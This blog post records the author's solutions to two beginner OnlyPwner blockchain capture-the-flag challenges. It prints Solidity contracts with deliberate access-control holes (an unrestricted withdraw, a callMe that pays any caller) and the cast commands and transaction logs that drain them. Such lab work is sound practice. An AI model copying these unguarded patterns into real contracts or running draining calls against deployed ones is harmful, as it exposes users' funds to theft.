---
layout: post
title:  OnlyPwner Challenges
date:   2024-08-25 02:39:33
categories: blockchain
post_id: 7
---

Solutions to the [OnlyPwner](https://onlypwner.xyz/leaderboard) challenges. This is not a walkthrough, just a self reference for my future self. Also, the platform frowns upon sharing writeups publicly.

### [Challenge 1 - FREEBIE](https://onlypwner.xyz/challenges/5)

### *Description*

***The Vault has been hailed as the next big thing in DeFi. Rumor has it, though, that a flaw was overlooked during its development. Do you have what it takes to uncover it?***

#### **WINNING CONDITION**

***The Vault is out of funds.***

***Challenge Code***

```solidity
pragma solidity 0.8.19;

import {IVault} from "./interfaces/IVault.sol";

contract Vault is IVault {
    uint256 public totalDeposited;

    function deposit() external payable {
        totalDeposited += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        totalDeposited -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdraw(msg.sender, amount);
    }
}

```

***Deployment Code***

```solidity
pragma solidity 0.8.19;

import {Vault} from "../src/Vault.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract Deploy is Script {
    function run() external {
        vm.startBroadcast();

        Vault vault = new Vault();
        vault.deposit{value: 10 ether}();

        console.log("address:Vault", address(vault));
    }
}
```

### *Solution*

This is just a sanity check challenge, all we need to do is to send a transaction to the contract calling the `withdraw` function with the `amount` parameter set to the value of `totalDeposited` which is `10 ether`. This will drain the contract of all its funds. We could deploy a contract to do this but that will be an overkill, we can simply use `cast` to send a transaction to the contract.

```bash
cast send 0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88  "withdraw(uint256)" "10ether" --private-key 0xdeadbeefdeadbeefdeadbeef --rpc-url https://nodes.onlypwner.xyz/rpc/cafebabe-e159-4cdb-9ecf-cafebabe --gas-price 0 --priority-gas-price 0

blockHash               0x206266cf5a8ae1c6e25c0330ab5ff1a18b906b857b4a0f8b774da7868026ae43
blockNumber             1503
contractAddress         
cumulativeGasUsed       30093
effectiveGasPrice       0
from                    0x34788137367a14f2C4D253F9a6653A93adf2D234
gasUsed                 30093
logs                    [{"address":"0x78ac353a65d0d0af48367c0a16eee0fbbc00ac88","topics":["0x884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364","0x00000000000000000000000034788137367a14f2c4d253f9a6653a93adf2d234"],"data":"0x0000000000000000000000000000000000000000000000008ac7230489e80000","blockHash":"0x206266cf5a8ae1c6e25c0330ab5ff1a18b906b857b4a0f8b774da7868026ae43","blockNumber":"0x5df","transactionHash":"0xc08d7c1a58535cf13c84f57036fcb5c4752d8def2cb928dfa8cd4f5be9bccfa8","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom               0x00000000000000000000000000000000000000000000000400100000800000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000024001000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0xc08d7c1a58535cf13c84f57036fcb5c4752d8def2cb928dfa8cd4f5be9bccfa8
transactionIndex        0
type                    2
blobGasPrice            
blobGasUsed             
authorizationList       
to                      0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88
depositNonce             null
```

***Challenge solved!***

### [Challenge 2 - TUTORIAL](https://onlypwner.xyz/challenges/1)

### *Tutorial - Description*

***This is a tutorial challenge.***

#### **Tutorial - WINNING CONDITION**

***Remove all the funds from the Tutorial contract.***

***Tutorial - Challenge Code***

```solidity
pragma solidity 0.8.19;

import {ITutorial} from "./interfaces/ITutorial.sol";

contract Tutorial is ITutorial {
    constructor() payable {}

    function callMe() external override {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Tutorial: call failed");
    }
}
```

***Tutorial - Deployment Code***

```solidity
pragma solidity 0.8.19;

import {Tutorial} from "../src/Tutorial.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract Deploy is Script {
    function run() external {
        vm.startBroadcast();

        Tutorial tutorial = new Tutorial{value: 10 ether}();

        console.log("address:Tutorial", address(tutorial));
    }
}
```

### *Tutorial - Solution*

This is another sanity check challenge, all we need to do is to send a transaction to the contract calling the `callMe` function. This will drain the contract of all its funds.

```bash
cast send 0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88  "callMe()" "0" --private-key 0xdeadbeefdeadbeefdeadbeef --rpc-url https://nodes.onlypwner.xyz/rpc/cafebabe-e159-4cdb-9ecf-cafebabe --gas-price 0 --priority-gas-price 0

blockHash               0xd7853cb3227bdb83239ade4020b667dfa623b0f6506d8203a8c84d9f9f5aec2e
blockNumber             187
contractAddress         
cumulativeGasUsed       28105
effectiveGasPrice       0
from                    0x34788137367a14f2C4D253F9a6653A93adf2D234
gasUsed                 28105
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0x1de9902b74965bdb2867ec053e80bfdf6eebbf88389316dd1e33908b4b8a0bb5
transactionIndex        0
type                    2
blobGasPrice            
blobGasUsed             
authorizationList       
to                      0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88
depositNonce             null
```

***Tutorial challenge solved!***